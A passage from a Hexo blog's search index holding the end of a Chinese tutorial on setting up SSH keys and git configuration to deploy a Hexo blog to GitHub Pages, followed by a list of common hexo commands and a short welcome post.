此时我们的博客还是存放在本地的，我们如果想能通过我们在第一步获取到的域名访问到该博客，还需将其上传到Github，如果你一切都配置好了，发布上传很容易，在Git Bash中一句hexo d就搞定了，当然关键还是你要把所有东西配置好。<br>　　首先我们需要配置ssh Key，在Git Bash中输入cd ~/.ssh，如果提示：No such file or directory 说明我们是第一次使用Git，表示正常，然后我们再输入$ ssh-keygen -t rsa -C “你在Github上注册时使用的邮箱地址”，然后git会输出：</p><p>Generating public/private rsa key pair.<br>Enter file in which to save the key (/Users/your_user_directory/.ssh/id_rsa):</p><p>这两句话，敲回车就好，再然后系统会要你输入密码，这个密码会在你提交项目时使用，如果为空的话提交项目时则不用输入。这个设置是防止别人往你的项目里提交内容。我输入密码时好像看不到输入了啥…应该两次输的一样就行。最后看到一个框框中间一堆符号就说明成功设置ssh key了。<br>　　接下里我们需要将ssh Key添加到Github，在类似于C:\Users\16875.ssh的文件夹中你会看到一个id_rsa.pub文件，用记事本将其打开复制其中的所有内容，如果看不到这个文件，你可能需要设置显示隐藏文件。准确的复制这个文件的内容，才能保证设置的成功。然后登陆Github，点击右上角的 Account Settings—-&gt;SSH Public keys —-&gt; add another public keys，把你本地生成的密钥复制到里面（key文本框中）， 点击 add key 就ok了。<br>　接下来我们可以测试一下设置是否成功，在Git Bash中输入$ ssh -T <a href="mailto:git@github.com">git@github.com</a>，如果响应以下内容：</p><p>The authenticity of host ‘github.com (207.97.227.239)’ can’t be established.<br>RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.<br>Are you sure you want to continue connecting (yes/no)?</p><p>接着输入yes，然后你就会看到一条确认成功的语句。<br>　　最后，我们还需要完善我们的个人信息，Git会根据用户的名字和邮箱来记录提交。GitHub也是用这些信息来做权限的处理，输入下面的代码进行个人信息的设置，把名称和邮箱替换成你在Github上注册时的，名字注意不是昵称是用户名。</p><p>$ git config –global user.name “C-0-RE”//用户名<br>$ git config –global user.email  “<a href="mailto:C-0-RE@gmail.com">C-0-RE@gmail.com</a>“//填写自己的邮箱</p><p>到此ssh Key配置就已全部完成。<br>　　最后的最后，我们要打开hexo文件夹，里面有一个名为_config.yml的文件，推荐用sublime打开，翻到文件的最下面，修改其中deploy的部分为如下：</p><p>deploy:<br>　　type: git<br>　　repository: <a href="mailto:git@github.com">git@github.com</a>:你Github的用户名/你Github的用户名.github.io.git<br>　　branch: master</p><p> 然后保存，关闭文件，再打开Git Bash输入一条命令npm install hexo-deployer-git –save，该命令用来安装一个插件，辅助提交。最后如本段开头所说的，输入hexo d，即可将本次有改动的代码全部提交，没有改动的不会。</p><h2 id="四、结语"><a href="#四、结语" class="headerlink" title="四、结语"></a>四、结语</h2><p>　　至此，应该就可以通过类似于 <a href="http://c-0-re.github.io" target="_blank" rel="noopener">http://c-0-re.github.io</a> 的域名直接访问我们的个人博客了。“广阔天地，大有作为”，即使是这样一个十分简单的博客，也还有许多可以让我们发挥创造、学习、修改的地方。</p><p>最后附上常用的hexo命令：<br>hexo new “postName” #新建文章<br>hexo new page “pageName” #新建页面<br>hexo generate #生成静态页面至public目录<br>hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）<br>hexo deploy #部署到GitHub<br>hexo help  # 查看帮助<br>hexo version  #查看Hexo的版本</p>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome To My Blog</title>
      <link href="/2020/06/05/welcome-to-my-blog/"/>
      <url>/2020/06/05/welcome-to-my-blog/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="New-start"><a href="#New-start" class="headerlink" title="New start,"></a><em>New start</em>,</h3><h3 id="New-journey-Let’s-do-something"><a href="#New-journey-Let’s-do-something" class="headerlink" title="　　　New journey.　　　　 Let’s do something."></a>　　　<em>New journey</em>.　　　　 <em>Let’s do something</em>.</h3>]]></content>
      
      
      
        <tags>
            
            <tag> Have a nice day! </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
